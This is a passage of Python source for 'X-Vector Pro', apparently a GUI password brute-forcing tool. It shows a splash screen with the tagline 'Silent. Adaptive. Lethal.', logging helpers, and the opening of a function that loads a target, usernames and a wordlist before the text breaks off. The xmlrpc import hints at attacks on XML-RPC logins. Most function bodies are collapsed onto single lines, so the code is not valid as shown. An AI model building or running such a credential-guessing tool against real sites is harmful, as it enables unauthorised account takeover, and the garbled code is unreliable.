import os
import json
import xmlrpc.client
from datetime import datetime
from tkinter import messagebox
import customtkinter as ctk
from utils import logger
from utils.settings import load_settings, save_settings

=== SPLASH SCREEN ===

def show_splash_screen(): splash = ctk.CTk() splash.geometry("400x200") splash.title("X-Vector Pro") ctk.CTkLabel(splash, text="Initializing X-Vector Pro...", font=("Arial", 18)).pack(pady=40) ctk.CTkLabel(splash, text="Silent. Adaptive. Lethal.", font=("Courier", 12)).pack() splash.after(2000, splash.destroy) splash.mainloop()

=== GUI LOGGER ===

def log_to_central(msg): timestamp = datetime.now().strftime("%H:%M:%S") logs_output.insert("end", f"[{timestamp}] {msg}\n") logs_output.see("end")

def gui_log_handler(entry, level="info"): tag = level log_textbox.insert("end", entry + "\n") log_textbox.tag_add(tag, f"end-{len(entry)+1}c", "end") log_textbox.see("end")

logger.central_log_hook = gui_log_handler

=== BRUTE FORCE ===

def run_brute_force(): target = target_entry.get().strip() usernames = [u.strip() for u in usernames_box.get("1.0", "end").strip().splitlines()] wordlist_path = wordlist_entry.get().strip()

if not target or not usernames or not wordlist_path:
    messagebox.showerror("Error", "Please fill all fields.")
    return

try:
    with open(wordlist_path, 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]
except Exception as e:
    messagebox.showerror("File Error", f"Cannot read password list:\n{e}")
    return

log_box.insert("end", "[*] Starting brute force...\

